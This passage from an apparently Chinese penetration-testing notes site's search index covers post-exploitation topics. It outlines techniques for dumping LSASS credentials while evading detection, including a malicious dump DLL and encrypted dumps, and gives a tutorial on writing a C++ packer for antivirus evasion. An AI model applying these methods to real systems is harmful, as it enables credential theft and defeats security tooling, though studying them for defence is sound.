4.\u6765\u81ea\u5fae\u4fe1\u5f00\u53d1\u8005\u793e\u533a\uff1a\u4efb\u52a1\u7ba1\u7406\u5668->\u627e\u5230\u5c0f\u7a0b\u5e8f\u7684\u7f13\u5b58\u76ee\u5f55\uff0c\u9000\u51fa\u5fae\u4fe1\uff0c\u5220\u6389\u76ee\u5f55\u91cd\u65b0\u8fdb\u5165\u5c31\u597d\u4e86\u3002\u4e00\u822c\u76ee\u5f55\u5730\u5740\u5728\uff1aC:\\Users\\{user}\\AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins\\WMPFRuntime 5.\u66f4\u591a\u6765\u81ea\u5fae\u4fe1\u5f00\u53d1\u8005\u793e\u533a\u7684\u89e3\u51b3\u529e\u6cd5\uff1a https://developers.weixin.qq.com/community/develop/doc/0008ee93caccd0a92f9ee17a051c00","title":"\u5c0f\u7a0b\u5e8f\u6293\u5305\u7684\u5751"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%90%8E%E6%B8%97%E9%80%8F/","text":"\u540e\u6e17\u900f \u6570\u636e\u641c\u96c6 \u514d\u6740 \u63d0\u6743 \u6743\u9650\u7ef4\u6301 \u5185\u7f51\u6e17\u900f","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%90%8E%E6%B8%97%E9%80%8F/#_1","text":"\u6570\u636e\u641c\u96c6 \u514d\u6740 \u63d0\u6743 \u6743\u9650\u7ef4\u6301 \u5185\u7f51\u6e17\u900f","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/","text":"\u514d\u6740 \u57fa\u7840\u514d\u6740\u624b\u6cd5\u66b4\u98ce\u5438\u5165 \u4ece0\u5f00\u59cb\u7528C++\u5199\u4e00\u4e2a\u52a0\u58f3\u5668 Dump lsaas\u7684\u5bf9\u6297\u6280\u5de7","title":"\u514d\u6740"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#_1","text":"\u57fa\u7840\u514d\u6740\u624b\u6cd5\u66b4\u98ce\u5438\u5165 \u4ece0\u5f00\u59cb\u7528C++\u5199\u4e00\u4e2a\u52a0\u58f3\u5668 Dump lsaas\u7684\u5bf9\u6297\u6280\u5de7","title":"\u514d\u6740"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/","text":"Dump lsaas\u7684\u5bf9\u6297\u6280\u5de7 \u83b7\u53d6\u53e5\u67c4\u7684\u5bf9\u6297\u65b9\u6848 \u6700\u5e38\u89c4\uff1aOpenProcess NtQuerySystemInformation \u83b7\u53d6\u6240\u6709\u8fdb\u7a0b\u53e5\u67c4\uff0c\u7136\u540e\u904d\u5386\u6bcf\u4e2a\u53e5\u67c4 +NtDuplicateObject \u5bf9\u5f53\u524d\u904d\u5386\u5230\u7684\u53e5\u67c4\u8fdb\u884c\u590d\u5236\u64cd\u4f5c +NtQueryObject+QueryFullProcessImageName \u83b7\u53d6\u5f53\u524d\u53e5\u67c4\u8be6\u7ec6\u4fe1\u606f\u5e76\u5339\u914d\u53e5\u67c4\u540d\u662f\u5426\u4e3alsaas \u627e\u5230lsaas\u7684Duplicate\u53e5\u67c4 NtCreateProcessEx \u521b\u5efa\u5b8c\u5168\u7ee7\u627f\u4e8elsass\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b dump\u5185\u5b58\u7684\u5bf9\u6297\u65b9\u6848 \u9759\u9ed8\u9000\u51fa \u5047\u88c5\u7ebf\u7a0b\u5d29\u6e83\u7136\u540e\u7cfb\u7edf\u81ea\u52a8\u5b58\u50a8dump\u5185\u5b58 lsaas SSP\u81ea\u52a0\u8f7dAddSecurityPackage \u8ba9lsaas\u8fdb\u7a0b\u81ea\u5df1\u52a0\u8f7d\u4e00\u4e2a\u6076\u610fdumpdll \u91cd\u5199MiniDumpWriteDump \u6216\u8005\u4f7f\u7528MiniDumpWriteDump\u7684\u56de\u8c03\u65b9\u6cd5 \u5c06\u8f6c\u50a8\u5185\u5bb9\u52a0\u5bc6","title":"Dump lsaas\u7684\u5bf9\u6297\u6280\u5de7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/#dump-lsaas","text":"","title":"Dump lsaas\u7684\u5bf9\u6297\u6280\u5de7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/#_1","text":"\u6700\u5e38\u89c4\uff1aOpenProcess NtQuerySystemInformation \u83b7\u53d6\u6240\u6709\u8fdb\u7a0b\u53e5\u67c4\uff0c\u7136\u540e\u904d\u5386\u6bcf\u4e2a\u53e5\u67c4 +NtDuplicateObject \u5bf9\u5f53\u524d\u904d\u5386\u5230\u7684\u53e5\u67c4\u8fdb\u884c\u590d\u5236\u64cd\u4f5c +NtQueryObject+QueryFullProcessImageName \u83b7\u53d6\u5f53\u524d\u53e5\u67c4\u8be6\u7ec6\u4fe1\u606f\u5e76\u5339\u914d\u53e5\u67c4\u540d\u662f\u5426\u4e3alsaas \u627e\u5230lsaas\u7684Duplicate\u53e5\u67c4 NtCreateProcessEx \u521b\u5efa\u5b8c\u5168\u7ee7\u627f\u4e8elsass\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b","title":"\u83b7\u53d6\u53e5\u67c4\u7684\u5bf9\u6297\u65b9\u6848"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/Dump%20lsaas%E7%9A%84%E5%AF%B9%E6%8A%97%E6%8A%80%E5%B7%A7/#dump","text":"\u9759\u9ed8\u9000\u51fa \u5047\u88c5\u7ebf\u7a0b\u5d29\u6e83\u7136\u540e\u7cfb\u7edf\u81ea\u52a8\u5b58\u50a8dump\u5185\u5b58 lsaas SSP\u81ea\u52a0\u8f7dAddSecurityPackage \u8ba9lsaas\u8fdb\u7a0b\u81ea\u5df1\u52a0\u8f7d\u4e00\u4e2a\u6076\u610fdumpdll \u91cd\u5199MiniDumpWriteDump \u6216\u8005\u4f7f\u7528MiniDumpWriteDump\u7684\u56de\u8c03\u65b9\u6cd5 \u5c06\u8f6c\u50a8\u5185\u5bb9\u52a0\u5bc6","title":"dump\u5185\u5b58\u7684\u5bf9\u6297\u65b9\u6848"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/","text":"\u4ece0\u5f00\u59cb\u7528C++\u5199\u4e00\u4e2a\u52a0\u58f3\u5668 \u76ee\u5f55 \u52a0\u58f3\u539f\u7406 \u624b\u5de5\u52a0\u58f3 \u771f\u6b63\u7684\u52a0\u58f3\u6d41\u7a0b \u57fa\u4e8ec++\u7684\u58f3\u7f16\u5199 Stub \u5408\u5e76\u6570\u636e\u6bb5 PEB\u52a8\u6001\u5bfb\u5740&\u5bfc\u51fa\u8868\u904d\u5386\u627e\u51fd\u6570 \u89e3\u5bc6 \u4fee\u6539\u5165\u53e3\u70b9 \u52a0\u58f3\u5668 \u8bf8\u591a\u81ea\u5b9a\u51fd\u6570&\u7ed3\u6784\u4f53 \u6253\u5f00PE\u6587\u4ef6 \u52a0\u8f7dSTUB \u52a0\u5bc6\u4ee3\u7801\u6bb5 \u6dfb\u52a0\u65b0\u533a\u6bb5 stub\u91cd\u5b9a\u4f4d stub\u79fb\u690d \u5165\u53e3\u70b9\u4fee\u6539 \u53bb\u968f\u673a\u57fa\u5740 \u4fdd\u5b58\u6587\u4ef6 \u540e\u8bb0 \u53c2\u8003: https://blog.csdn.net/qq_31507523/article/details/89438410 \u5b66\u4e60\u4e00\u4e0b\u5199\u58f3\uff0c\u5728\u4ee5\u540e\u514d\u6740\u4e2d\u4f7f\u7528\u3002 \u52a0\u58f3\u539f\u7406 \u624b\u5de5\u52a0\u58f3 \u7528010editor\u624b\u5de5\u52a0\u58f3\u4e86\u89e3\u4e00\u6ce2\u539f\u7406\u3002\u52a0\u58f3\u539f\u7406\u5927\u81f4\u5982\u4e0b \u5373\u6211\u4eec\u5411PE\u6587\u4ef6\u6dfb\u52a0\u4e00\u4e2a\u533a\u6bb5\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u5165\u53e3\u70b9\uff0c\u8fd9\u6837PE\u6587\u4ef6\u6700\u5f00\u59cb\u6267\u884c\u7684\u547d\u4ee4\u5c31\u662f\u6211\u4eec\u6dfb\u52a0\u7684\u533a\u6bb5\u4e5f\u5c31\u662f\u58f3\u7684\u6307\u4ee4\uff0c\u58f3\u5bf9\u52a0\u5bc6\u533a\u8fdb\u884c\u89e3\u5bc6\uff0c\u5bf9\u538b\u7f29\u533a\u8fdb\u884c\u89e3\u538b\uff0c\u5c06\u539f\u672c\u7684EXE\u6587\u4ef6\u8fd8\u539f\u51fa\u6765\uff0c\u7136\u540e\u8df3\u8f6c\u81f3\u539f\u7a0b\u5e8f\u5165\u53e3\uff0c\u7a0b\u5e8f\u7167\u5e38\u8fd0\u884c\u3002 \u9996\u5148\u751f\u6210\u4e00\u4e2a\u6253\u5370hello\u7684exe\u6587\u4ef6\u3002 #include <stdio.h> int main() { printf(\"hello\"); } \u6211\u4eec\u76ee\u524d\u8981\u5e72\u7684\u4e8b\u60c5\u662f:\u4ee5\u624b\u52a8\u7684\u5f62\u5f0f\u5411PE\u6587\u4ef6\u6dfb\u52a0\u4e00\u4e2a\u58f3\u90e8\u5206\u5e76\u8bbe\u4e3a\u7a0b\u5e8f\u5165\u53e3\uff0c\u5e76\u4f7f\u5176\u80fd\u8df3\u8f6c\u56de\u539f\u5165\u53e3\u3002 \u90a3\u5c31\u6765\u5427 \u7528010editor\u6253\u5f00\u6211\u4eec\u7684exe\u6587\u4ef6\uff0c\u542f\u7528exe\u6a21\u677f\u5206\u6790\u3002 \u6211\u4eec\u9996\u5148\u4fee\u6539\u5176\u6587\u4ef6\u5934numverofsection\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7528\u6765\u5b9a\u4e49\u5f53\u524dPE\u6587\u4ef6\u5b58\u5728\u591a\u5c11\u4e2a\u533a\u6bb5,\u56e0\u4e3a\u6211\u4eec\u8981\u6dfb\u52a0\u4e00\u4e2a\u58f3\u533a\u6bb5\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u5176\u52a01\u53d8\u62106 \u5728\u6211\u4eec\u91cd\u8f7d\u6a21\u677f\u540e\u6211\u4eec\u5c31\u4f1a\u5728\u533a\u6bb5\u8868\u53d1\u73b0\u591a\u51fa\u6765\u4e00\u4e2a\u7a7a\u7684\u533a\u6bb5\u8868 \u4ece\u4e0a\u5230\u4e0b\u5404\u4e2a\u6bd4\u8f83\u91cd\u8981\u5b57\u6bb5\u7684\u610f\u601d\u662f \\1. Name \u8868\u793a\u8be5\u533a\u6bb5\u7684\u540d\u5b57 2.VirtualSize \u8868\u793a\u5728\u5185\u5b58\u4e2d\u7684\u5927\u5c0f(\u4e00\u822c\u5185\u5b58\u5bf9\u9f50\u4e3a0x1000) 3.virtualaddress \u865a\u62df\u5730\u5740 \u5373\u4e0a\u4e00\u4e2a\u533a\u6bb5\u7684VirtualAddress + \u4e0a\u4e00\u4e2a\u533a\u6bb5\u7ecf\u5185\u5b58\u5bf9\u9f50\u7c92\u5ea6\u5bf9\u9f50\u540e\u7684\u5927\u5c0f 4.sizeofdata \u8868\u793a\u5728\u6587\u4ef6\u4e2d\u7684\u5927\u5c0f\uff08\u4e00\u822c\u6587\u4ef6\u5bf9\u9f50\u4e3a0x200) 5.pointertorawdata \u6587\u4ef6\u7684\u504f\u79fb \u5373 \u4e0a\u4e00\u4e2a\u533a\u6bb5\u7684PointerToRawData + \u4e0a\u4e00\u4e2a\u533a\u6bb5\u7684SizeOfRawData \u7136\u540e\u6211\u4eec\u901a\u8fc7\u4fee\u6539\u4ee5\u4e0a\u5404\u503c\u6765\u5b9a\u4e49\u4e00\u4e2a\u65b0\u533a\u6bb5\uff08\u58f3\u533a\u6bb5)\u7684\u5c5e\u6027 \u8fd9\u91cc\u7684virtualsize\u770b\u7740\u586b\u4e00\u4e2a\u5c31\u884c\u4e86\u3002 \u6b64\u65f6\u6211\u4eec\u53ea\u662f\u5b9a\u4e49\u4e86\u533a\u6bb5\u8868\uff0c\u4f46\u6587\u4ef6\u4e2d\u5e76\u6ca1\u6709\u8be5\u533a\u6bb5\u5b58\u5728\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u521b\u5efa\u8be5\u533a\u6bb5\u3002 \u7136\u540e\u8fd8\u8981\u8ba9\u533a\u6bb5\u53ef\u7f16\u8f91\uff0c\u628a\u4e0b\u5217\u503c\u6539\u4e3a1\u5373\u53ef ctrl+shift+i \u5411\u76ee\u6807\u6587\u4ef6\u504f\u79fb\u5904\u63d2\u51650x200\u5927\u5c0f\u7684\u7a7a\u95f4\u3002 \u8fd9\u6837\u4e00\u6765\uff0c\u58f3\u533a\u6bb5\u5c31\u521b\u5efa\u597d\u4e86\u3002 \u7136\u540e\u6211\u4eec\u8fd8\u8981\u4fee\u6539 \u6269\u5c55\u5934\u7684SizeofImage \u3002\u5c06\u4ed6\u6539\u4e3a\u6700\u540e\u4e00\u4e2a\u533a\u6bb5\u7684\u5185\u5b58\u5730\u5740+\u5185\u5b58\u5927\u5c0f \u7136\u540e\u53bb\u6389\u968f\u673a\u57fa\u5740\u9009\u9879\u3002 \u627e\u5230\u6269\u5c55\u5934\u7684DLL\u5c5e\u6027\u5b57\u6bb5\uff0c\u53bb\u6389\u968f\u673a\u57fa\u5740\uff0c\u628a40 81\u6539\u4e3a 00 81 \u63a5\u4e0b\u6765\u6211\u4eec\u628a\u7a0b\u5e8f\u5165\u53e3\u70b9\u8bbe\u7f6e\u7ed9\u58f3\u533a\u6bb5\u3002 \u4f7f\u7528LORDPE\u628a\u5165\u53e3\u70b9\u8bbe\u4e3a\u58f3\u533a\u5757\u7684\u865a\u62df\u5730\u5740 \u7136\u540e\u6211\u4eec\u7528OD\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6 \u771f\u6b63\u7684\u52a0\u58f3\u6d41\u7a0b \u521a\u521a\u63d0\u5230\u7684\u624b\u5de5\u52a0\u58f3\uff0c\u4e0d\u8fc7\u662f\u6700\u6700\u57fa\u7840\u7684\u52a0\u58f3\u539f\u578b\u800c\u5df2\uff0c\u771f\u6b63\u7684\u52a0\u58f3\u8fd8\u6d89\u53ca\u4e86\u4ee3\u7801\u52a0\u89e3\u5bc6\u7b49\u64cd\u4f5c. \u771f\u6b63\u5199\u58f3\u65f6\u4e00\u822c\u5199\u4e24\u4e2a\u4e1c\u897f\uff0c\u52a0\u58f3\u5668\u548cstub \u6240\u8c13\u52a0\u58f3\u5668\uff0c\u5c31\u662f\u7ed9\u88ab\u52a0\u58f3\u6587\u4ef6\u521b\u9020\u51fa\u4e00\u4e2a\u65b0\u7684\u533a\u6bb5\uff0c \u5728\u6b64\u540c\u65f6\u5c06\u7a0b\u5e8f\u4ee5\u67d0\u79cd\u65b9\u5f0f\u52a0\u5bc6\uff0c\u7136\u540e\u628astub\u653e\u5165\u65b0\u533a\u6bb5\uff0c\u5e76\u5c06\u7a0b\u5e8f\u5165\u53e3\u70b9\u8bbe\u4e3a\u65b0\u533a\u6bb5\u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u65b0\u533a\u6bb5\u7ed3\u675f\u540e\u8df3\u8f6c\u56de\u539f\u7a0b\u5e8f\u5165\u53e3\u3002\u8fd9\u4e2a\u65b0\u533a\u6bb5\u6211\u4eec\u53eb\u505a\u58f3\u533a\u6bb5. \u90a3\u4e48\u8fd9\u4e2astub\u5c31\u662f\u52a0\u58f3\u540e\u7a0b\u5e8f\u6700\u5148\u6267\u884c\u7684\u547d\u4ee4\u4e86\uff0c\u5b83\u6267\u884c\u89e3\u5bc6\u7b97\u6cd5\uff0c\u5c06\u539f\u7a0b\u5e8f\u91ca\u653e\u51fa\u6765\u3002 \u57fa\u4e8ec++\u7684\u58f3\u7f16\u5199 \u5b9e\u73b0\u4e86\u4e00\u4e2a\u859b\u5b9a\u8c14\u7684\u52a0\u58f3\u5668\uff08\u96fe\uff09 \u52a0\u58f3\u597d\u7684\u7a0b\u5e8f\u6709\u4e00\u5b9a\u51e0\u7387\u8fd0\u884c\u4e0d\u4e86\uff0c\u539f\u56e0\u672a\u77e5\u3002\u3002 https://github.com/ConsT27/PackingEXE/tree/master \ud83d\udc48\u9879\u76ee\u5730\u5740 \u5f88\u5927\u4e00\u90e8\u5206\u4e0a\u662f\u501f\u9274\u8fd9\u4e2a\u8001\u54e5\u7684 https://github.com/TonyChen56/GuiShou_Pack \u7b2c\u4e00\u6b21\u63a5\u89e6\u6c47\u7f16\u7f16\u7a0b\uff0cc++\u7f16\u7a0b\uff0c\u4e0a\u6765\u5c31\u662f\u641e\u8fd9\u4e48\u4e00\u4e2a\u9879\u76ee\uff0c\u641e\u4e86\u5feb\u4e24\u4e2a\u661f\u671f\uff0c\u786e\u5b9e\u6709\u70b9\u75db\u82e6\uff0c\u5230\u73b0\u5728\u8fd8\u6709\u5f88\u5927\u90e8\u5206\u4e0d\u662f\u5f88\u61c2\u7684\u5730\u65b9\uff08\u6bd4\u5982\u8bb8\u591a\u6570\u636e\u7c7b\u578b\u4ee5\u53ca\u5e95\u5c42\u6c47\u7f16\uff08\u7b11\ud83d\ude01 \u8fd9\u4e2a\u9879\u76ee\u4e5f\u5b58\u5728bug\uff0c\u4e5f\u5c31\u662f\u521a\u521a\u8bf4\u7684\u7a0b\u5e8f\u6709\u51e0\u7387\u4e0d\u80fd\u8fd0\u884c\u7684\u95ee\u9898\u3002\ud83d\ude21 \u4f46\u662f\u4e5f\u5b66\u5230\u4e86\u633a\u591a\uff0c\u6bd4\u5982PEB\u52a8\u6001\u5bfb\u5740\uff0cPE\u6587\u4ef6\u7ed3\u6784\u7b49\u7b49\u3002\ud83d\ude01 \u82e6\u4e8e\u7f51\u4e0a\u6ca1\u6709\u4e00\u7bc7\u6587\u7ae0\u8be6\u7ec6\u7684\u4ea4\u4ee3\u4e86\u6280\u672f\u7684\u7ec6\u8282\uff0c\u6240\u4ee5\u8fd9\u7bc7\u6587\u7ae0\u4f1a\u5c3d\u53ef\u80fd\u7684\u8be6\u7ec6\u3002 \u63a5\u4e0b\u6765\u662f\u5404\u4e2a\u6d41\u7a0b\u7684\u8be6\u7ec6\u5b9e\u73b0\u65b9\u6cd5\uff0c\u81f3\u4e8e\u600e\u4e48\u628a\u5404\u4e2a\u6d41\u7a0b\u94fe\u63a5\u8d77\u6765\uff0c\u5e08\u5085\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u8f7d\u4e0a\u9762\u63d0\u5230\u7684\u4e24\u4e2a\u9879\u76ee\u6765\u770b\u4e00\u4e0b\u3002 Stub stub\u662f\u88ab\u690d\u5165\u5230PE\u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\uff0c\u5b83\u4e00\u822c\u4f1a\u5e72\u4e0b\u9762\u8fd9\u4e9b\u4e8b\u60c5\u3002 \u6d41\u7a0b\u5982\u4e0b 0.\u5408\u5e76data\uff0crdata\u5230text 1.PEB\u52a8\u6001\u5bfb\u5740\uff0c\u904d\u5386\u5bfc\u51fa\u8868\u627e\u5230GetProcAddress\u51fd\u6570 2.\u89e3\u5bc6 3.\u4fee\u6539\u5165\u53e3\u70b9\u5230\u539f\u5165\u53e3\u70b9 \u540c\u65f6stub\u4e00\u822c\u4ee5dll\u7684\u5f62\u5f0f\u5b58\u5728\u3002\u539f\u56e0\u662fDLL\u901a\u5e38\u81ea\u5e26\u91cd\u5b9a\u4f4d\u8868\uff0c\u8fd9\u5728\u6211\u4eec\u7684\u79fb\u690d\u8fc7\u7a0b\u4e2d\u7684\u91cd\u5b9a\u4f4d\u64cd\u4f5c\u4e2d\u63d0\u4f9b\u4e86\u5de8\u5927\u7684\u4fbf\u5229\u3002 \u5408\u5e76\u6570\u636e\u6bb5 \u6211\u4eec\u8981\u79fb\u690dstub\u8fc7\u53bb\uff0c\u80af\u5b9a\u9700\u8981\u79fb\u690d\u4ee3\u7801\u6bb5\uff0c\u4e5f\u9700\u8981\u79fb\u690d\u6570\u636e\u6bb5\u3002\u4e0d\u5982\u6211\u4eec\u5e72\u8106\u628a\u6570\u636e\u6bb5\u5408\u5e76\u5230\u4ee3\u7801\u6bb5\uff0c\u4e00\u5757\u79fb\u690d\u8fc7\u53bb\u3002 PEB\u52a8\u6001\u5bfb\u5740&\u5bfc\u51fa\u8868\u904d\u5386\u627e\u51fd\u6570 \u4e3a\u4ec0\u4e48\u4f1a\u7528\u5230\u8fd9\u4e2a\u6280\u672f\u7f16\u5199stub\uff1f \u56e0\u4e3a\u6211\u4eec\u7684stub.dll\u690d\u5165\u5230\u5bbf\u4e3b\u7a0b\u5e8f\u65f6\uff0c\u53ea\u6709.text\u690d\u5165\u8fc7\u53bb\uff0c\u6ca1\u6709\u5bf9\u5e94\u7684\u5bfc\u5165\u8868\uff0c\u6240\u4ee5\u6211\u4eec\u7684stub\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528\u4e00\u4e9bAPI\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u52a8\u6001\u83b7\u53d6\u5404\u79cdAPI\u3002 \u5176\u4e2d\u6211\u91c7\u7528\u7684\u662fPEB\u52a8\u6001\u67e5\u8be2\u5f97\u5230GetProcAddress\u51fd\u6570\uff0c\u7136\u540e\u7528GetProcAddress\u51fd\u6570\u53bb\u83b7\u53d6\u5404\u4e2aAPI\u3002 \u90a3\u4e48\uff0c\u4ec0\u4e48\u662fPEB\uff1f PEB\u662f\u4e00\u4e2a\u5fae\u8f6f\u8fd8\u672a\u5b8c\u5168\u516c\u5f00\u4f5c\u7528\u7684\u4e00\u4e2a\u7ed3\u6784\uff0c\u5b83\u53eb\u505a \u8fdb\u7a0b\u73af\u5883\u4fe1\u606f\u5757 \uff0c\u5305\u542b\u4e86\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u5176\u7ed3\u6784\u5982\u4e0b typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; //\u88ab\u8c03\u8bd5\u72b6\u6001 BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; } PEB, *PPEB; \u590d\u5236\u4ee3\u7801 \u6211\u4eec\u5173\u5fc3\u7684\u662fPEB\u504f\u79fb0c\u5f97\u5230\u7684 PPEB_LDR_DATA Ldr; \u5b83\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2a PPEB_LDR_DATA \u7ed3\u6784\uff0c \u5b58\u653e\u7740\u5df2\u7ecf\u88ab\u8fdb\u7a0b\u88c5\u5728\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4fe1\u606f typedef struct _PEB_LDR_DATA { \u3000ULONG Length; // +0x00 \u3000BOOLEAN Initialized; // +0x04 \u3000PVOID SsHandle; // +0x08 \u3000LIST_ENTRY InLoadOrderModuleList; // +0x0c \u3000LIST_ENTRY InMemoryOrderModuleList; // +0x14 \u3000LIST_ENTRY InInitializationOrderModuleList;// +0x1c } PEB_LDR_DATA,*PPEB_LDR_DATA; // +0x24 PPEB_LDR_DATA \u504f\u79fb1c\u662f\u4e00\u4e2a\u6307\u5411LIST_ENTRY InInitializationOrderModuleList\u7ed3\u6784\u7684\u6307\u9488\uff0c\u8fd9\u4e2a\u7ed3\u6784 \u5b58\u653e\u7740\u6307\u5411\u6a21\u5757\u521d\u59cb\u5316\u94fe\u8868\u7684\u5934 \uff0c \u6309\u987a\u5e8f\u5b58\u653e\u7740PE\u88c5\u5165\u8fd0\u884c\u65f6\u521d\u59cb\u5316\u6a21\u5757\u4fe1\u606f\uff0c\u4e00\u822c\u6765\u8bf4\u7b2c\u4e00\u4e2a\u94fe\u8868\u7ed3\u70b9\u662fntdll.dll,\u7b2c\u4e8c\u4e2a\u94fe\u8868\u7ed3\u70b9\u5c31\u662fkernel32.dll \u3002\u6211\u4eec\u5c31\u5728\u5176\u4e2d\u627e\u5230kernel32.dll\u7684\u4fe1\u606f\uff0c\u83b7\u53d6\u5176PE\u4fe1\u606f\uff0c\u5f97\u5230\u5bfc\u51fa\u8868\uff0c\u5faa\u73af\u904d\u5386\u5f97\u5230GetProcAddress\u51fd\u6570\u3002 \u53e6\u5916\uff0cPEB\u5730\u5740\u518dTEB\u504f\u79fb0x30\u5904\u3002\u7528\u6c47\u7f16\u8bed\u8a00\u8868\u793a\u5c31\u662f fs:[0x30]\u3002 \u4ee5\u4e0a\u662fPEB\u5bfb\u5740\u7684\u5927\u81f4\u6d41\u7a0b\uff0c\u53e6\u5916\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u5173\u952e\u7684\u70b9\u662f\u904d\u5386kernel32.dll\u5bfc\u51fa\u8868\u83b7\u5f97GetProcAddress\u51fd\u6570\u4fe1\u606f\u3002 \u5173\u4e8e\u5bfc\u51fa\u8868\u53ef\u4ee5\u770b\u770b\u8fd9\u4e2a\u6587\u7ae0 https://blog.csdn.net/evileagle/article/details/12176797 \u9996\u5148\u4e00\u4e2a\u5bfc\u51fa\u8868\u7ed3\u6784\u4f53\u5982\u4e0b typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //\u4e00\u822c\u4e3a0\uff0c\u6ca1\u5565\u7528 DWORD TimeDateStamp; //\u5bfc\u51fa\u8868\u751f\u6210\u7684\u65f6\u95f4 WORD MajorVersion; //\u7248\u672c\uff0c\u4e5f\u662f0\u6ca1\u5565\u7528 WORD MinorVersion; //\u4e5f\u662f\u6ca1\u5565\u7528\u7684\u7248\u672c\u4fe1\u606f\u4e00\u822c\u4e3a0 DWORD Name; //\u5f53\u524d\u5bfc\u51fa\u8868\u7684\u6a21\u5757\u540d\u5b57 DWORD Base; //\u5e8f\u53f7\u8868\u4e2d\u5e8f\u53f7\u7684\u57fa\u6570 DWORD NumberOfFunctions; //\u5bfc\u51fa\u51fd\u6570\u6570\u91cf DWORD NumberOfNames; //\u6309\u540d\u5b57\u5bfc\u51fa\u51fd\u6570\u7684\u6570\u91cf DWORD AddressOfFunctions; // \u5e8f\u53f7\u8868 DWORD AddressOfNames; // \u540d\u79f0\u8868 DWORD AddressOfNameOrdinals; // \u5730\u5740\u8868 } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; \u5176\u4e2d\u5e8f\u53f7\u8868\u7684\u8d77\u59cb\u5e8f\u53f7\u662fBase\u5c5e\u6027\u5b9a\u4e49\u7684\u503c\u3002\u4ee5\u4e0b\u662f\u5bfc\u51fa\u8868\u7684\u5e8f\u53f7\u540d\u79f0\u5730\u5740\u8868\u7684\u5173\u7cfb 